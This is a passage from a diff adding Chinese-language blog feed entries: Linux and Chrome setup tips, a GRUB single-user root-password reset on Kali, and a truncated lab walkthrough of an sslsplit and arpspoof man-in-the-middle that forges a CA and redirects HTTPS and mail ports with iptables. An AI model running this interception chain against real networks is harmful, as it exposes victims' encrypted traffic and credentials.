href="https://github.com/rustdesk/rustdesk-server/issues">Issues</a>，也可以在评论区互相交流探讨。</p><p>同时，有能力给项目做贡献的同学，也欢迎积极加入到<a href="https://github.com/rustdesk">项目</a>中来，贡献自己的一份力量！</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://github.com/rustdesk/rustdesk-server">https://github.com/rustdesk/rustdesk-server</a></p>]]></content>
+    
+    
+    <summary type="html">rustdesk</summary>
+    
+    
+    
+    <category term="tools" scheme="https://macin.top/categories/tools/"/>
+    
+    <category term="docker" scheme="https://macin.top/categories/tools/docker/"/>
+    
+    
+    <category term="tools" scheme="https://macin.top/tags/tools/"/>
+    
+    <category term="docker" scheme="https://macin.top/tags/docker/"/>
+    
+    <category term="rustdesk" scheme="https://macin.top/tags/rustdesk/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>windows远程访问ubuntu服务器桌面，安装XRDP远程桌面</title>
+    <link href="https://macin.top/posts/b69b7f1c/"/>
+    <id>https://macin.top/posts/b69b7f1c/</id>
+    <published>2024-12-19T14:43:04.000Z</published>
+    <updated>2024-12-24T12:40:19.189Z</updated>
+    
+    <content type="html"><![CDATA[<p>执行命令：</p><p>用root用户登录vps </p><p>如何创建root用户： </p><p>步骤1： 给root用户设置密码： </p><p>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure><p>输入密码，并确认密码。 </p><p>步骤2： 重新输入命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure><p>然后输入密码： 发现可以切换到root权限了。 </p><p>如何切换到root用户： </p><p>步骤1： 重新输入命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure><p>然后输入密码： 发现可以切换到root权限了。</p><p>添加新用户 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adduser noss </span><br><span class="line"><span class="comment">#noss为新添加的用户名</span></span><br></pre></td></tr></table></figure><p>安装 Ubuntu 图形用户界面 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update -y </span><br><span class="line"></span><br><span class="line">sudo apt install ubuntu-desktop -y</span><br></pre></td></tr></table></figure><p>安装和配置 RDP 服务器 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install xrdp -y </span><br><span class="line"></span><br><span class="line">sudo systemctl status xrdp </span><br><span class="line"></span><br><span class="line">sudo vim /etc/xrdp/xrdp.ini </span><br></pre></td></tr></table></figure><p>修改： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">port=tcp://:3389</span><br></pre></td></tr></table></figure><hr><p>启动RDP服务 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart xrdp</span><br></pre></td></tr></table></figure><p>在防火墙上打开 RDP 端口（如果有防火墙） </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw allow 3389</span><br></pre></td></tr></table></figure><p>安装chrome 浏览器 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install chromium-browser</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">ubuntu,os</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/tags/ubuntu/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>linux安装和配置v2rayn</title>
+    <link href="https://macin.top/posts/3c4072e6/"/>
+    <id>https://macin.top/posts/3c4072e6/</id>
+    <published>2024-12-19T12:45:05.000Z</published>
+    <updated>2024-12-24T12:40:19.186Z</updated>
+    
+    <content type="html"><![CDATA[<p>v2rayN下载：<a href="https://github.com/2dust/v2rayN/releases">Releases · 2dust&#x2F;v2rayN</a></p><p>添加执行权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x v2rayN</span><br></pre></td></tr></table></figure><p>启动：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./v2rayN</span><br></pre></td></tr></table></figure><p>tun模式启动：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./v2rayN</span><br></pre></td></tr></table></figure><p>桌面图标启动</p><p>在桌面文件夹，下创建v2rayN.desktop文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> v2rayN.desktop</span><br></pre></td></tr></table></figure><p>编辑如下配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[Desktop Entry]</span><br><span class="line">Version=1.0</span><br><span class="line">Name=v2rayN</span><br><span class="line">Comment=一款稳定的桌面代理客户端软件</span><br><span class="line">Exec=v2rayN文件路径</span><br><span class="line">Icon=v2rayN图标路径</span><br><span class="line">Terminal=<span class="literal">false</span></span><br><span class="line">Type=Application</span><br><span class="line">Categories=Utility;</span><br></pre></td></tr></table></figure><p>添加执行权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x v2rayN.desktop</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">v2ray,proxy,linux,kali,debian</summary>
+    
+    
+    
+    <category term="proxy" scheme="https://macin.top/categories/proxy/"/>
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/categories/os/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    <category term="v2ray" scheme="https://macin.top/categories/proxy/v2ray/"/>
+    
+    
+    <category term="tools" scheme="https://macin.top/tags/tools/"/>
+    
+    <category term="proxy" scheme="https://macin.top/tags/proxy/"/>
+    
+    <category term="linux" scheme="https://macin.top/tags/linux/"/>
+    
+    <category term="v2ray" scheme="https://macin.top/tags/v2ray/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>linux中的cron如何设置和管理</title>
+    <link href="https://macin.top/posts/5743d22f/"/>
+    <id>https://macin.top/posts/5743d22f/</id>
+    <published>2024-12-19T12:25:48.000Z</published>
+    <updated>2024-12-24T12:40:19.185Z</updated>
+    
+    <content type="html"><![CDATA[<p>在Kali Linux中，可以使用crontab命令来设置和管理Cron作业。以下是一些常用的操作：</p><p>查看当前用户的Cron作业列表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure><p>编辑当前用户的Cron作业：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure><p>这将打开一个文本编辑器，您可以在其中编写和编辑Cron作业。每行表示一个Cron作业，格式为：分钟 小时 日 月 周 命令。</p><p>删除当前用户的Cron作业：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -r</span><br></pre></td></tr></table></figure><p>添加一个新的Cron作业：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure><p>然后在文本编辑器中添加新的Cron作业。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nano  <span class="comment">#编辑器 </span></span><br><span class="line"></span><br><span class="line">ctrl+x <span class="comment">#退出保存</span></span><br></pre></td></tr></table></figure><p>查看系统中所有用户的Cron作业：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> /var/spool/cron/crontabs</span><br></pre></td></tr></table></figure><p>执行Cron作业： Cron作业将在指定的时间自动执行，您无需手动执行。您可以在**&#x2F;var&#x2F;log&#x2F;syslog**中查看Cron作业的执行情况。</p><p>查看Cron服务状态：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service cron status</span><br></pre></td></tr></table></figure><p>通过以上方法，您可以设置和管理Kali Linux中的Cron作业。请注意，对于某些敏感任务，建议谨慎设置Cron作业，以免造成系统问题。</p><p>例子：</p><p>每天11：12执行shell自动化脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12 11 * * * /bin/bash path/to/xxx.sh</span><br></pre></td></tr></table></figure><p>每月的第一天凌晨4点同步数据到远程服务器</p><p>如果我们需要每月的第一天凌晨4点将数据同步到远程服务器，可以在<code>crontab</code>文件中添加如下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 4 1 * * rsync -avz /data/ user@remote-server:/data/</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">linux,os,ubuntu,debian</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/categories/os/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/tags/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/tags/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>kali实现开机root权限</title>
+    <link href="https://macin.top/posts/3e38cd7e/"/>
+    <id>https://macin.top/posts/3e38cd7e/</id>
+    <published>2024-12-19T12:09:07.000Z</published>
+    <updated>2024-12-24T12:40:19.185Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="一、新版介绍"><a href="#一、新版介绍" class="headerlink" title="一、新版介绍"></a><strong>一、新版介绍</strong></h2><p>Kali默认不是以root管理员身份运行的，有时候像我这样的懒人每次都要sudo su提升权限，就很麻烦。所以这里我介绍一种在Kali中完美以root权限执行的方法。</p><h2 id="二、实验步骤"><a href="#二、实验步骤" class="headerlink" title="二、实验步骤"></a><strong>二、实验步骤</strong></h2><p>查看您的Kali是否处于root权限，$为普通用户 #为root模式。</p><p><img src="/img/kaliroot/1.webp"></p><p><img src="/img/kaliroot/2.webp"></p><p>接下来我们开始进行配置，首先重启kali进而配置单用户模式，输入命令：reboot，重启。</p><p>在如下图所示的页面按住字母e键，进入如下图所示的页面进行配置。</p><p><img src="/img/kaliroot/3.webp"></p><p><img src="/img/kaliroot/4.webp"></p><blockquote><p>更改配置文件，在linux这一行，将ro改为rw，在splash后空一格，添加命令：init&#x3D;&#x2F;bin&#x2F;bash,如下图所示。</p></blockquote><p><img src="/img/kaliroot/5.webp"></p><p>配置完上图的页面后，按住f10进入以下单用户页面，如下图所示，回车继续。</p><p>系统进入单用户的命令行模式</p><p><img src="/img/kaliroot/6.webp"></p><p><strong>更改root（管理员用户）用户密码，如下图所示。</strong></p><p><strong>命令：passwd root</strong></p><p><strong>New password:</strong></p><p><strong>Retype new password:</strong></p><p><img src="/img/kaliroot/7.webp"></p><p>最后重启客户端，用root用户登录就好了。</p>]]></content>
+    
+    
+    <summary type="html">kali,os,hack</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    <category term="hack" scheme="https://macin.top/categories/hack/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+    <category term="hack" scheme="https://macin.top/tags/hack/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>解决linux无法使用drissionpage库打开chrome的问题</title>
+    <link href="https://macin.top/posts/42310953/"/>
+    <id>https://macin.top/posts/42310953/</id>
+    <published>2024-12-18T14:35:41.000Z</published>
+    <updated>2024-12-24T12:40:19.193Z</updated>
+    
+    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DrissionPage <span class="keyword">import</span> ChromiumPage</span><br><span class="line"><span class="keyword">from</span> DrissionPage <span class="keyword">import</span> ChromiumOptions</span><br><span class="line"><span class="keyword">from</span> DrissionPage.easy_set <span class="keyword">import</span> set_headless, set_paths</span><br><span class="line">set_headless(<span class="literal">True</span>)  <span class="comment">#无头模式，隐藏浏览器运行</span></span><br><span class="line"></span><br><span class="line">co = ChromiumOptions()</span><br><span class="line">co.set_paths(browser_path=<span class="string">r&#x27;/usr/bin/google-chrome&#x27;</span>)  <span class="comment">#注意chrome的执行文件位置</span></span><br><span class="line"><span class="comment">#co.set_argument(&#x27;--incognito&#x27;)   #可有可无，未知用法</span></span><br><span class="line">co.set_argument(<span class="string">&#x27;--no-sandbox&#x27;</span>)   <span class="comment">#linux要加入这一行代码</span></span><br><span class="line"></span><br><span class="line">page = ChromiumPage(co)</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">centos,ubuntu,os,debian,kali</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="centos" scheme="https://macin.top/categories/os/centos/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/categories/os/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/tags/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/tags/debian/"/>
+    
+    <category term="centos" scheme="https://macin.top/tags/centos/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+    <category term="linux" scheme="https://macin.top/tags/linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>linux安装pythonvenv环境</title>
+    <link href="https://macin.top/posts/f717803c/"/>
+    <id>https://macin.top/posts/f717803c/</id>
+    <published>2024-12-18T14:20:04.000Z</published>
+    <updated>2024-12-24T12:40:19.186Z</updated>
+    
+    <content type="html"><![CDATA[<p>在Kali Linux系统中，Python venv是一个非常有用的工具，可以帮助用户在虚拟环境中独立安装和管理Python包。本文将介绍如何在Kali Linux系统上安装Python venv环境，并演示如何使用它来创建和管理虚拟环境。</p><h3 id="步骤一：安装Python-venv"><a href="#步骤一：安装Python-venv" class="headerlink" title="步骤一：安装Python venv"></a>步骤一：安装Python venv</h3><p>首先，确保你的Kali Linux系统已经安装了Python。如果尚未安装Python，可以使用以下命令安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install python3</span><br></pre></td></tr></table></figure><p>一旦Python安装完成，你可以安装Python venv模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3-venv</span><br></pre></td></tr></table></figure><h3 id="步骤二：创建虚拟环境"><a href="#步骤二：创建虚拟环境" class="headerlink" title="步骤二：创建虚拟环境"></a>步骤二：创建虚拟环境</h3><p>接下来，我们将演示如何在Kali Linux系统上创建一个名为<code>myenv</code>的新虚拟环境。请按照以下步骤操作：</p><p>首先，创建一个新目录来存储虚拟环境：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> myenv</span><br><span class="line"><span class="built_in">cd</span> myenv</span><br></pre></td></tr></table></figure><p>然后，在该目录中创建一个名为<code>venv</code>的虚拟环境：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m venv venv</span><br></pre></td></tr></table></figure><p>激活虚拟环境，：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> venv/bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment">#或者cd到venv/bin的位置去activate</span></span><br></pre></td></tr></table></figure><blockquote><p>激活虚拟环境后，你会注意到终端提示符前会显示<code>(venv)</code>，表示当前已经进入了虚拟环境。</p></blockquote><h3 id="步骤三：使用虚拟环境"><a href="#步骤三：使用虚拟环境" class="headerlink" title="步骤三：使用虚拟环境"></a>步骤三：使用虚拟环境</h3><p>一旦虚拟环境已经激活，你可以在其中安装和管理Python包。例如，我们可以使用<a href="https://edu.51cto.com/lesson/970202.html?utm_platform=pc&utm_medium=51cto&utm_source=shequ&utm_content=bk_article_keyword#pip">pip</a>在虚拟环境中安装一个名为<code>requests</code>的包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure><p>如果你想退出虚拟环境，只需运行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过本文的介绍，你已经学会了在Kali Linux系统上安装和使用Python venv环境的方法。使用虚拟环境可以帮助你更好地管理Python包，避免不必要的冲突。希望这篇文章对你有所帮助！</p>]]></content>
+    
+    
+    <summary type="html">centos,ubuntu,os,debian,kali,python3,coding</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="coding" scheme="https://macin.top/categories/coding/"/>
+    
+    <category term="centos" scheme="https://macin.top/categories/os/centos/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/categories/os/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    <category term="python3" scheme="https://macin.top/categories/coding/python3/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/tags/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/tags/debian/"/>
+    
+    <category term="centos" scheme="https://macin.top/tags/centos/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+    <category term="coding" scheme="https://macin.top/tags/coding/"/>
+    
+    <category term="linux" scheme="https://macin.top/tags/linux/"/>
+    
+    <category term="python3" scheme="https://macin.top/tags/python3/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>chrome和edge浏览器进阶设置</title>
+    <link href="https://macin.top/posts/1601f0a/"/>
+    <id>https://macin.top/posts/1601f0a/</id>
+    <published>2024-12-17T12:22:23.000Z</published>
+    <updated>2024-12-24T12:40:19.182Z</updated>
+    
+    <content type="html"><![CDATA[<p>Chrome浏览器进阶设置，一套提升谷歌浏览器整体使用体验的解决方案，全方位设置谷歌浏览器，实现提升网页打开速度|提升下载速度，真正发挥出谷歌浏览器应有的样子！</p><h1 id="1、关闭安全搜索"><a href="#1、关闭安全搜索" class="headerlink" title="1、关闭安全搜索"></a>1、关闭安全搜索</h1><ul><li><p>打开google.com——点击右下角的设置——点击搜索设置——点击安全搜索——选择关闭</p></li><li><p>浏览器选项中提示“<strong>由贵单位管理</strong>”解决方案</p><ul><li>谷歌 <code>Chrome</code> 浏览器地址栏输入 <code>Chrome://policy</code> ，即可看到调用企业策略的第三方软件或者是用户主动安装的第三方扩展等。</li><li>Windows系统按WIN+R输入“regedit”运行注册表管理</li><li>删除注册表\HKEY_CURRENT_USER\Software\Policies\Google\Chrome\下对应的文件夹（删除整个Chrome目录）<ul><li>HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome（<strong>如果上面的目录找不到，用这个</strong>）</li></ul></li></ul></li></ul><h1 id="2、提升网页打开速度"><a href="#2、提升网页打开速度" class="headerlink" title="2、提升网页打开速度"></a>2、提升网页打开速度</h1><ul><li><p>关闭使用安全DNS（所谓的安全DNS，也就是加密DNS，启用后有大概率导致打开网页缓慢）</p><ul><li>设置——点击隐私和安全——关闭使用安全DNS（此功能如果有需要，可以开启）</li></ul></li><li><p>设置——性能——开启预加载——选择扩展型预加载&#x2F;标准预加载（本操作会占用内存，根据自己电脑配置来选择）</p><ul><li>优点：<ul><li>加快网页加载速度。</li><li>减少了等待时间，体验更加流畅。</li><li>提前进行 DNS 解析和链接预取，浏览器可以减少网络延迟，在某些网络环境中有助于提升页面响应速度。</li><li>减少因为网络波动或其他问题导致的加载失败，提升页面的可靠性。</li></ul></li><li>缺点：<ul><li>增加流量消耗。</li><li>占用内存和 CPU 资源，打开标签页时间越长，占用资源越多。</li><li>占用大量缓存空间，导致缓存快速填满。</li></ul></li></ul></li><li><p>设置——点击系统——开启硬件加速（根据自己电脑配置来选择，一般情况下选择开启）</p><ul><li>优点：<ul><li>显著提升浏览器的渲染速度，使网页滚动和动画更流畅，视频播放更加顺畅。</li><li>降低 CPU 负载，减少卡顿。</li></ul></li><li>缺点：<ul><li>增加 GPU 占用</li><li>增加显卡功耗</li></ul></li></ul></li><li><p><strong>开启前面两个功能的情况下，注意关闭未使用的标签页，打开的标签页越多，Chrome 的运行速度就越慢。</strong></p></li></ul><h1 id="3、安全设置"><a href="#3、安全设置" class="headerlink" title="3、安全设置"></a>3、安全设置</h1><ul><li><p>启用密码管理</p><ul><li>点击右上角三个小点——点击密码和自动填充——点击Google密码管理工具——点击设置——启用提示保存密码和通行密钥和自动登录</li></ul></li><li><p>启用安全浏览</p><ul><li>设置——点击隐私和安全——选择标准保护——启用一律使用安全连接</li></ul></li></ul><h1 id="4、开启Chrome实验室功能"><a href="#4、开启Chrome实验室功能" class="headerlink" title="4、开启Chrome实验室功能"></a>4、开启Chrome实验室功能</h1><ul><li>打开chrome:&#x2F;&#x2F;flags&#x2F;页面<ul><li>Experimental QUIC protocol：启用QUIC协议，可以提高网页加载速度，尤其在网络延迟较高时。</li><li>GPU rasterization：启用GPU光栅化，可以提高图形渲染性能，尤其在处理图形密集型的网站时。</li><li>Smooth Scrolling：启用平滑滚动，可以改善网页滚动体验，使之更加流畅。</li><li>Parallel downloading：启用并行下载以加快下载速度。</li><li>Overlay Scrollbars：自动收起滚动条。</li></ul></li></ul><h1 id="5、安装扩展提升浏览体验"><a href="#5、安装扩展提升浏览体验" class="headerlink" title="5、安装扩展提升浏览体验"></a>5、安装扩展提升浏览体验</h1><ul><li>点击右上角三个小点——点击扩展程序——点击访问Chrome应用商店<ul><li><a href="https://chromewebstore.google.com/detail/adguard-%E5%B9%BF%E5%91%8A%E6%8B%A6%E6%88%AA%E5%99%A8/bgnkhhnnamicmpeenaelnjfhikgbkllg?hl=zh-CN&utm_source=ext_sidebar">AdGuard 广告拦截器</a></li><li><a href="https://chromewebstore.google.com/detail/%E7%AF%A1%E6%94%B9%E7%8C%B4/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=zh-CN&utm_source=ext_sidebar">Tampermonkey</a>（下载脚本常用）</li><li><a href="https://chromewebstore.google.com/detail/%E6%B8%85%E6%B4%81%E5%B7%A5-%E5%88%A0%E9%99%A4cookie%E5%92%8C%E7%BC%93%E5%AD%98/ogfjgagnmkiigilnoiabkbbajinanlbn?utm_source=ext_app_menu">清洁工 – 删除cookie和缓存</a>（配合前面的设置使用）</li></ul></li></ul>]]></content>
+    
+    
+    <summary type="html">chrome,web</summary>
+    
+    
+    
+    <category term="web" scheme="https://macin.top/categories/web/"/>
+    
+    <category term="chrome" scheme="https://macin.top/categories/web/chrome/"/>
+    
+    
+    <category term="web" scheme="https://macin.top/tags/web/"/>
+    
+    <category term="chrome" scheme="https://macin.top/tags/chrome/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>利用sslsplit+arpspoof实现arp欺骗</title>
+    <link href="https://macin.top/posts/ec393b70/"/>
+    <id>https://macin.top/posts/ec393b70/</id>
+    <published>2024-12-16T15:14:08.000Z</published>
+    <updated>2024-12-24T12:40:19.190Z</updated>
+    
+    <content type="html"><![CDATA[<p>准备</p><blockquote><p>一台win7虚拟机，IP：192.168.88.130   默认网关：192.168.88.2</p><p>一台kali虚拟机，IP：192.168.88.129</p></blockquote><p>SSLsplit 是一个针对 SSL&#x2F;TLS 加密的网络连接进行攻击，为网络取证和渗透测试的工具。它会终止 SSL &#x2F; TLS 和启动一个新的连接到原来的目的地，记录所有传输的数据。它支持普通的 TCP 和 SSL，HTTP 和 HTTPS，和 IPv4 和 IPv6。http不做介绍仅仅实现代理功能，ssl实现代理的同时要与服务器建立连接，同时伪造证书与客户端建立连接，即双连接，依据获取的client信息再与服务器通信，从而实现明文数据监听。</p><h1 id="1、利用openssl生成证书私钥"><a href="#1、利用openssl生成证书私钥" class="headerlink" title="1、利用openssl生成证书私钥"></a>1、利用openssl生成证书私钥</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out ca.key 2048</span><br></pre></td></tr></table></figure><h1 id="2、利用私钥签名生成证书"><a href="#2、利用私钥签名生成证书" class="headerlink" title="2、利用私钥签名生成证书"></a>2、利用私钥签名生成证书</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -x509 -days 1096 -key ca.key -out ca.crt</span><br></pre></td></tr></table></figure><p>在目录下生成ca.key私钥文件和ca.crt证书文件</p><h1 id="3、开启路由转发功能"><a href="#3、开启路由转发功能" class="headerlink" title="3、开启路由转发功能"></a>3、开启路由转发功能</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.ip_forward=1</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /proc/sys/net/ipv4/ip_forward</span><br><span class="line">1             <span class="comment">#屏幕输出1，说明开启成功</span></span><br></pre></td></tr></table></figure><h1 id="4、设置iptables端口转发规则"><a href="#4、设置iptables端口转发规则" class="headerlink" title="4、设置iptables端口转发规则"></a>4、设置iptables端口转发规则</h1><h2 id="1、清空当前表规则："><a href="#1、清空当前表规则：" class="headerlink" title="1、清空当前表规则："></a>1、清空当前表规则：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -F  </span><br></pre></td></tr></table></figure><h2 id="2、设置iptables端口转发规则："><a href="#2、设置iptables端口转发规则：" class="headerlink" title="2、设置iptables端口转发规则："></a>2、设置iptables端口转发规则：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080　【<span class="comment">#HTTP】</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443 【<span class="comment">#HTTPS】</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443 【<span class="comment">#MSA】</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443 【<span class="comment">#SMTPS】</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443 【<span class="comment">#IMAPS】</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443 【<span class="comment">#POP3S】</span></span><br></pre></td></tr></table></figure><p>（-t:指定表;-A PERROUTING:路由前生效;-p:指定协议;–dport:接受流量的端口;-j:指定处理方法（REDIRECT重定向）;–to-ports:转发端口）</p><h2 